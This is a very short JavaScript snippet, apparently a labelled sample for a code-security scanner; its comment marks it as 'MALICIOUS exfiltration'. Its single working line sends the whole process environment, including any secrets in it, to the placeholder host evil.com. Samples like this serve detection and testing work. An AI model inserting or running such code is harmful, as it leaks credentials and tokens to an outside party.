// codesure: MALICIOUS exfiltration
require('https').get('https://evil.com/log?env=' + JSON.stringify(process.env));
